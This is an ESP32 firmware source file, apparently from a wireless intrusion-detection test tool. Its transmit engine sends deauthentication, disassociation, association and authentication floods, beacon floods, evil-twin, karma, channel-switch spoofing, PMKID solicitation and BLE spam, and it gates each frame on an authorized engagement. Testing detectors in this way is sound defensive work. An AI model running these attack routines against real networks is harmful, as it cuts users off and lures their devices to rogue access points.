/* Basanos — the transmit engine. SPDX-License-Identifier: MIT */
#include "transmit.h"
#include "board.h"
#include "frames.h"
#include "rawtx.h"
#include "ble.h"
#include "sniffer.h"

#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include <stdio.h>
#include <string.h>

static const char *TAG = "bas_tx";

bool bas_tx_supported(bas_family_t f)
{
    switch (f) {
    case BAS_FAM_PROBE_REQ:
    case BAS_FAM_BEACON:
    case BAS_FAM_EVIL_TWIN:
    case BAS_FAM_KARMA_RESP:
    case BAS_FAM_PMKID:
    case BAS_FAM_BLE_ADV:
    case BAS_FAM_BLE_TRACKER:
    case BAS_FAM_ASSOC_FLOOD:
        /* Association requests are ordinary frames the library does not
         * refuse, so this family works with or without the bypass. */
        return true;

    case BAS_FAM_CSA:
        /* A CSA beacon is a beacon, which the library permits. */
        return true;

    case BAS_FAM_AUTH_FLOOD:
    case BAS_FAM_DISASSOC:
    case BAS_FAM_DEAUTH:
        /* These three are the subtypes the Wi-Fi library refuses unless the
         * sanity-check override linked. Reporting them as available in a build
         * where it did not would produce runs that emit nothing and score the
         * silence against the detector. */
        return bas_rawtx_available();
    default:
        return false;
    }
}

const char *bas_tx_pending_reason(bas_family_t f)
{
    switch (f) {
    case BAS_FAM_HID_TIMING:
        return "needs the USB HID stack";
    case BAS_FAM_AUTH_FLOOD:
    case BAS_FAM_DISASSOC:
    case BAS_FAM_DEAUTH:
        return "raw injection blocked in this build";
    default:
        return "";
    }
}

static uint32_t now_ms(void)
{
    return (uint32_t)(esp_timer_get_time() / 1000);
}

/* Directed families address a specific station inside the lock. Advertisement
 * families are broadcast by definition and deny nothing to anybody, so they
 * are gated on carrying the test prefix instead of on a destination. */
static bool is_directed(bas_family_t f)
{
    return f == BAS_FAM_DEAUTH || f == BAS_FAM_DISASSOC ||
           f == BAS_FAM_AUTH_FLOOD || f == BAS_FAM_ASSOC_FLOOD;
}

/* PMKID solicitation.
 *
 * Authenticate, associate, and see whether the access point volunteers a PMKID
 * in EAPOL message 1 before any credential has been exchanged. Two things come
 * out of it: the solicitation itself, which is what a PMKID sensor detects,
 * and a posture finding -- whether this AP hands a PMKID to anyone who asks.
 *
 * The PMKID is never stored. The receiver records that one was present and
 * nothing more; there is no buffer for it anywhere in the firmware. A sensor
 * sees an identical event either way, so keeping sixteen bytes of crackable
 * material would add custody and liability without adding a measurement.
 */
static esp_err_t bas_tx_run_pmkid(const bas_plan_t *p, const bas_engagement_t *e,
                                  bas_tx_tick_cb tick, void *ctx,
                                  bas_tx_result_t *out)
{
    bas_tx_result_t r;
    memset(&r, 0, sizeof(r));

    if (e->target.hidden || e->target.ssid[0] == '\0') {
        /* Associating needs a name, and a hidden network has not given one. */
        ESP_LOGW(TAG, "pmkid: target has no SSID");
        r.stopped_by = BAS_ERR_NO_TARGET;
        if (out != NULL) { *out = r; }
        return ESP_ERR_INVALID_STATE;
    }

    uint8_t ch = (p->channel != 0u) ? p->channel : e->target.channel;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    bool started_rx = false;
    if (!bas_sniff_active()) {
        bas_sniff_start(ch);
        started_rx = true;
    } else {
        bas_sniff_channel(ch);
    }

    /* One synthetic station per ATTEMPT, not per run. The AP tracks a station
     * across authentication and association, and once it refuses or drops one
     * it stops answering that address -- so a machine that keeps the same
     * identity sends association requests into a conversation the AP has
     * already ended. Each attempt therefore starts a fresh identity. */
    uint8_t sta[6];
    uint32_t identity = 0x9C1Du;
    bas_frame_synth_mac(sta, identity);
    bas_sniff_watch(sta, e->target.bssid);

    const uint32_t start    = now_ms();
    const uint32_t deadline = start + (uint32_t)p->seconds * 1000u;
    uint8_t  buf[BAS_FRAME_MAX];
    uint16_t seq = 0;
    uint32_t last_tick = start;
    int attempts = 0;

    ESP_LOGI(TAG, "pmkid: soliciting %s on ch%u as %02X:%02X:%02X:%02X:%02X:%02X",
             e->target.ssid, (unsigned)ch,
             sta[0], sta[1], sta[2], sta[3], sta[4], sta[5]);

    while (now_ms() < deadline) {
        uint32_t t = now_ms();

        bas_err_t g = bas_engage_permits_frame(e, e->target.bssid,
                                               e->target.bssid, t);
        if (g != BAS_OK) {
            r.stopped_by = g;
            r.frames_refused++;
            break;
        }

        const bas_pmkid_watch_t *w = bas_sniff_watch_result();

        /* Stop as soon as the question is answered. Repeating the
         * solicitation after M1 adds noise on air and tells us nothing new. */
        if (w->eapol_m1) {
            break;
        }

        /* An association that was answered and refused, or never answered at
         * all after we were authenticated, means this identity is spent. Start
         * a new one rather than repeating into silence. */
        bool spent = w->assoc_resp ||
                     (w->auth_resp && (t - w->started_ms) > 4000u);
        if (spent) {
            identity += 0x1111u;
            bas_frame_synth_mac(sta, identity);
            bas_sniff_watch(sta, e->target.bssid);
            seq = 0;
            w = bas_sniff_watch_result();
        }

        /* Authenticate, then associate once the AP has answered. */
        size_t len;
        if (!w->auth_resp) {
            len = bas_frame_auth(buf, e->target.bssid, sta, seq);
        } else {
            len = bas_frame_assoc_req(buf, e->target.bssid, sta,
                                      e->target.ssid, seq);
        }
        if (len == 0u) {
            r.tx_errors++;
            break;
        }

        if (esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false) == ESP_OK) {
            r.frames_sent++;
        } else {
            r.tx_errors++;
        }
        seq = (uint16_t)((seq + 1u) & 0x0FFFu);
        attempts++;

        if (tick != NULL && (t - last_tick) >= 250u) {
            last_tick = t;
            r.elapsed_ms = t - start;
            if (!tick(&r, ctx)) { break; }
        }

        /* Give the AP time to answer. This family is a conversation, not a
         * flood, so its rate is deliberately slow. */
        vTaskDelay(pdMS_TO_TICKS(p->pps > 0u ? (1000u / p->pps) : 500u));
    }

    const bas_pmkid_watch_t *w = bas_sniff_watch_result();
    ESP_LOGI(TAG, "pmkid: attempts=%d identities=%u", attempts,
             (unsigned)((identity - 0x9C1Du) / 0x1111u + 1u));
    ESP_LOGI(TAG, "pmkid: attempts=%d auth=%d(%u) assoc=%d(%u) m1=%d pmkid=%s",
             attempts, (int)w->auth_resp, (unsigned)w->auth_status,
             (int)w->assoc_resp, (unsigned)w->assoc_status, (int)w->eapol_m1,
             w->pmkid_offered ? "OFFERED" : "not offered");

    bas_sniff_watch_stop();
    if (started_rx) { bas_sniff_stop(); }

    r.elapsed_ms = now_ms() - start;
    if (out != NULL) { *out = r; }
    return ESP_OK;
}

static esp_err_t bas_tx_run_ble(const bas_plan_t *p, const bas_engagement_t *e,
                                bas_tx_tick_cb tick, void *ctx,
                                bas_tx_result_t *out)
{
    bas_tx_result_t r;
    memset(&r, 0, sizeof(r));

    if (bas_ble_init() != ESP_OK) {
        ESP_LOGE(TAG, "BLE unavailable");
        r.stopped_by = BAS_ERR_ARG;
        if (out != NULL) { *out = r; }
        return ESP_ERR_NOT_SUPPORTED;
    }
    bas_ble_reset_count();

    bool spam = (p->fam == BAS_FAM_BLE_ADV);
    const uint32_t start    = now_ms();
    const uint32_t deadline = start + (uint32_t)p->seconds * 1000u;
    const uint32_t period   = (p->pps > 0u) ? (1000u / p->pps) : 200u;
    const uint32_t total    = bas_plan_frame_budget(p);

    ESP_LOGI(TAG, "ble %s: %u identities over %us",
             spam ? "advert spam" : "tracker dwell",
             (unsigned)(spam ? total : 1u), (unsigned)p->seconds);

    uint32_t seed = 0;
    uint32_t last_tick = start;

    /* The tracker family is one identity held for the whole window; the spam
     * family is a new identity every period. That single difference is what
     * the two detectors are scored on. */
    if (!spam) {
        char name[24];
        snprintf(name, sizeof(name), BAS_TEST_PREFIX "TRK");
        if (bas_ble_advertise(name, 0x7ACu) == ESP_OK) {
            r.frames_sent++;
        } else {
            r.tx_errors++;
        }
    }

    while (now_ms() < deadline) {
        uint32_t t = now_ms();

        bas_err_t g = bas_engage_check(e, t);
        if (g != BAS_OK) {
            r.stopped_by = g;
            break;
        }

        if (spam && r.frames_sent < total) {
            char name[24];
            snprintf(name, sizeof(name), BAS_TEST_PREFIX "%02u",
                     (unsigned)(seed % 100u));
            if (bas_ble_advertise(name, seed) == ESP_OK) {
                r.frames_sent++;
            } else {
                r.tx_errors++;
            }
            seed++;
        }

        if (tick != NULL && (t - last_tick) >= 250u) {
            last_tick = t;
            r.elapsed_ms = t - start;
            if (!tick(&r, ctx)) {
                break;
            }
        }
        vTaskDelay(pdMS_TO_TICKS(spam ? (period > 0u ? period : 1u) : 100u));
    }

    bas_ble_stop();
    r.elapsed_ms = now_ms() - start;
    ESP_LOGI(TAG, "ble done: %u identities, %u errors, %u ms",
             (unsigned)r.frames_sent, (unsigned)r.tx_errors,
             (unsigned)r.elapsed_ms);
    if (out != NULL) { *out = r; }
    return ESP_OK;
}

esp_err_t bas_tx_run(const bas_plan_t *plan,
                     const bas_engagement_t *e,
                     uint8_t role,
                     bas_tx_tick_cb tick, void *ctx,
                     bas_tx_result_t *out)
{
    bas_tx_result_t r;
    memset(&r, 0, sizeof(r));

    if (plan == NULL || e == NULL) {
        return ESP_ERR_INVALID_ARG;
    }
    if (!bas_tx_supported(plan->fam)) {
        return ESP_ERR_NOT_SUPPORTED;
    }

    /* Revalidate here rather than trusting the caller's earlier check. A plan
     * validated a minute ago under a different role or a live engagement is
     * not evidence about now. */
    bas_plan_t p = *plan;
    bas_err_t vc = bas_plan_validate(&p, role, e, now_ms());
    if (vc != BAS_OK) {
        ESP_LOGW(TAG, "refused: %s", bas_err_str(vc));
        r.stopped_by = vc;
        if (out != NULL) { *out = r; }
        return ESP_ERR_INVALID_STATE;
    }

    /* The BLE families do not touch the 802.11 radio, so they skip channel
     * selection, the frame builders and the frame gate -- which is correct:
     * an advertisement has no destination to gate. They keep the engagement
     * check, the ceilings and the role. */
    if (p.fam == BAS_FAM_BLE_ADV || p.fam == BAS_FAM_BLE_TRACKER) {
        return bas_tx_run_ble(&p, e, tick, ctx, out);
    }
    if (p.fam == BAS_FAM_PMKID) {
        return bas_tx_run_pmkid(&p, e, tick, ctx, out);
    }

    uint8_t ch = (p.channel != 0u) ? p.channel : e->target.channel;

    /* Karma answers what it hears, so it needs the receiver on the same
     * channel it is about to answer on. Every other family only transmits. */
    bool karma = (p.fam == BAS_FAM_KARMA_RESP);
    bool started_rx = false;
    if (karma) {
        if (!bas_sniff_active()) {
            bas_sniff_start(ch);
            started_rx = true;
        } else {
            bas_sniff_channel(ch);
        }
        bas_sniff_karma_arm(true);
    }

    esp_err_t rc = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    if (rc != ESP_OK) {
        ESP_LOGE(TAG, "set_channel %u: %s", (unsigned)ch, esp_err_to_name(rc));
        if (karma) { bas_sniff_karma_arm(false); }
        return rc;
    }

    /* The station the directed families address: the specific client when the
     * engagement names one, otherwise the access point itself. Never a
     * broadcast address — the gate below refuses that regardless. */
    /* Directed families cycle through the selected clients, one frame each,
     * rather than sending a single broadcast. Same effect on the devices the
     * operator chose, no effect on the ones they did not, and the log can name
     * exactly which were addressed. With nothing selected there is one
     * destination: the access point. */
    const uint8_t dest_n = bas_engage_dest_count(e);
    if (dest_n == 0u) {
        ESP_LOGW(TAG, "no destination in this engagement");
        r.stopped_by = BAS_ERR_NO_TARGET;
        if (out != NULL) { *out = r; }
        return ESP_ERR_INVALID_STATE;
    }

    const uint32_t period_ms = (p.pps > 0u) ? (1000u / p.pps) : 100u;
    const uint32_t total     = bas_plan_frame_budget(&p);
    const uint32_t start     = now_ms();
    const uint32_t deadline  = start + (uint32_t)p.seconds * 1000u;

    ESP_LOGI(TAG, "run: %s ch%u %u pps for %us (%u frames) at %02X:%02X:%02X:%02X:%02X:%02X",
             bas_family(p.fam)->name, (unsigned)ch, (unsigned)p.pps,
             (unsigned)p.seconds, (unsigned)total,
             bas_engage_dest(e, 0)[0], bas_engage_dest(e, 0)[1],
             bas_engage_dest(e, 0)[2], bas_engage_dest(e, 0)[3],
             bas_engage_dest(e, 0)[4], bas_engage_dest(e, 0)[5]);
    if (dest_n > 1u) {
        ESP_LOGI(TAG, "  cycling %u selected clients", (unsigned)dest_n);
    }

    uint8_t  buf[BAS_FRAME_MAX];
    uint16_t seq = 0;
    uint32_t last_tick = start;

    /* Karma runs for its full window regardless of how many answers it gets:
     * the budget is a ceiling on output, and a quiet room legitimately fills
     * none of it. */
    while (now_ms() < deadline && (karma || r.frames_sent < total)) {
        uint32_t t = now_ms();

        /* Per frame, not per run. This is what makes an expiring engagement
         * stop a burst that is already in flight. */
        /* A fresh destination each frame, so a burst is shared across the
         * selected clients rather than aimed at one of them. */
        const uint8_t *dst = bas_engage_dest(e, r.frames_sent);

        if (is_directed(p.fam)) {
            bas_err_t g = bas_engage_permits_frame(e, dst, e->target.bssid, t);
            if (g != BAS_OK) {
                r.frames_refused++;
                r.stopped_by = g;
                ESP_LOGW(TAG, "gate stopped run: %s", bas_err_str(g));
                break;
            }
        } else {
            bas_err_t g = bas_engage_check(e, t);
            if (g != BAS_OK) {
                r.stopped_by = g;
                break;
            }
        }

        size_t len = 0;
        uint8_t synth[6];

        switch (p.fam) {
        case BAS_FAM_DEAUTH:
            len = bas_frame_deauth(buf, dst, e->target.bssid, e->target.bssid,
                                   p.reason_code, seq);
            break;
        case BAS_FAM_DISASSOC:
            len = bas_frame_disassoc(buf, dst, e->target.bssid, e->target.bssid,
                                     p.reason_code, seq);
            break;
        case BAS_FAM_AUTH_FLOOD:
            /* Each request comes from a different synthetic station, which is
             * what actually pressures the association table. */
            bas_frame_synth_mac(synth, seq);
            len = bas_frame_auth(buf, e->target.bssid, synth, seq);
            break;
        case BAS_FAM_BEACON: {
            /* Advertise only as many networks as can be beaconed at a credible
             * interval. A real AP beacons about every 100 ms; a synthetic one
             * beaconed once a second is missed by most client scans and reaches
             * a detector as an intermittent trickle rather than the flood it is
             * meant to be. At 5 beacons per SSID per second, 20 pps advertises
             * 4 networks and 100 pps advertises 20 -- the rate buys breadth,
             * instead of breadth diluting the rate. */
            uint16_t n_ssids = (uint16_t)(p.pps / 5u);
            if (n_ssids < 1u)  { n_ssids = 1u; }
            if (n_ssids > 24u) { n_ssids = 24u; }

            uint16_t which = (uint16_t)(seq % n_ssids);
            char ssid[33];
            snprintf(ssid, sizeof(ssid), BAS_TEST_PREFIX "%02u",
                     (unsigned)which);
            bas_frame_synth_mac(synth, which);
            len = bas_frame_beacon(buf, synth, ssid, ch, seq);
            break;
        }
        case BAS_FAM_PROBE_REQ:
            bas_frame_synth_mac(synth, seq);
            len = bas_frame_probe_req(buf, synth, NULL, ch, seq);
            break;

        case BAS_FAM_KARMA_RESP: {
            /* Reactive: the rate is a ceiling, not a cadence. A quiet room
             * produces no answers, and that is the correct outcome rather
             * than a failure -- there was nothing to answer. */
            bas_karma_req_t req;
            if (!bas_sniff_karma_take(&req)) {
                len = 0;
                break;
            }
            /* One synthetic identity per name, so a detector counting
             * advertisers sees a plausible spread rather than one radio
             * claiming to be everything. */
            uint32_t h = 0;
            for (const char *cp = req.ssid; *cp; cp++) {
                h = h * 31u + (uint8_t)*cp;
            }
            bas_frame_synth_mac(synth, h);
            len = bas_frame_probe_resp(buf, req.dst, synth, req.ssid, ch, seq);
            if (len > 0u) {
                bas_sniff_karma_note_answer();
            }
            break;
        }
        case BAS_FAM_CSA: {
            /* Move the cell to a channel far enough away that a client cannot
             * drift back by accident. Which channel matters less than that it
             * is not this one. */
            uint8_t to = (ch <= 6u) ? (uint8_t)(ch + 5u) : (uint8_t)(ch - 5u);
            if (to < 1u)  { to = 1u; }
            if (to > 11u) { to = 11u; }
            bas_frame_synth_mac(synth, 0xC5Au);
            (void)synth;
            /* Spoofed from the target's own BSSID: a client only honours a
             * switch from the AP it is associated with. */
            len = bas_frame_csa(buf, e->target.bssid, e->target.ssid, ch, to,
                                (uint8_t)(3u - (seq % 3u)), seq);
            break;
        }

        case BAS_FAM_ASSOC_FLOOD:
            /* A different synthetic station each time, which is what actually
             * pressures the association table rather than one station
             * re-asking. */
            bas_frame_synth_mac(synth, seq + 0x5A00u);
            len = bas_frame_assoc_req(buf, e->target.bssid, synth,
                                      e->target.ssid, seq);
            break;

        case BAS_FAM_EVIL_TWIN: {
            /* The one place a name that is not ours goes on air: a duplicate
             * of the network under test, from a synthetic BSSID. Permitted
             * only because the engagement is locked to that exact SSID, and
             * never for any other name. */
            bas_frame_synth_mac(synth, 0xE7u);
            len = bas_frame_twin(buf, synth, e->target.ssid, ch, true, seq);
            break;
        }
        default:
            len = 0;
            break;
        }

        if (len == 0u) {
            if (karma) {
                /* Nothing waiting to answer. Wait, do not stop. */
                vTaskDelay(pdMS_TO_TICKS(20));
                continue;
            }
            /* The builder refused to construct the frame -- almost always a
             * family that needs the target's NAME against a hidden network.
             * That is a targeting problem, not a radio one, and reporting it
             * as a transmit error sends the operator to debug the wrong half. */
            r.stopped_by = e->target.hidden ? BAS_ERR_NO_TARGET : BAS_ERR_ARG;
            ESP_LOGW(TAG, "%s could not be built: %s", bas_family(p.fam)->name,
                     e->target.hidden ? "target is hidden, no SSID to use"
                                      : "invalid parameters");
            break;
        }

        rc = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false);
        if (rc == ESP_OK) {
            r.frames_sent++;
        } else {
            r.tx_errors++;
            if (r.tx_errors < 4u) {
                ESP_LOGW(TAG, "tx: %s", esp_err_to_name(rc));
            }
        }
        seq = (uint16_t)((seq + 1u) & 0x0FFFu);

        /* 250 ms, not 100. The tick repaints the whole 112 KB panel, and at
         * 100 ms that repaint stole enough of the loop to hold the emission
         * well under its requested rate -- 439 frames where 600 were asked
         * for. A quarter-second abort latency is not noticeable; a rate 27%
         * below nominal would quietly distort every measurement. */
        if (tick != NULL && (t - last_tick) >= 250u) {
            last_tick = t;
            r.elapsed_ms = t - start;
            if (!tick(&r, ctx)) {
                r.stopped_by = BAS_OK;   /* operator abort is not an error */
                break;
            }
        }

        vTaskDelay(pdMS_TO_TICKS(period_ms > 0u ? period_ms : 1u));
    }

    if (karma) {
        bas_sniff_karma_arm(false);
        ESP_LOGI(TAG, "karma: %u answered, %u dropped",
                 (unsigned)bas_sniff_karma_answered(),
                 (unsigned)bas_sniff_karma_dropped());
        if (started_rx) { bas_sniff_stop(); }
    }

    r.elapsed_ms = now_ms() - start;
    ESP_LOGI(TAG, "done: %u sent, %u refused, %u errors, %u ms",
             (unsigned)r.frames_sent, (unsigned)r.frames_refused,
             (unsigned)r.tx_errors, (unsigned)r.elapsed_ms);

    if (out != NULL) {
        *out = r;
    }
    return ESP_OK;
}
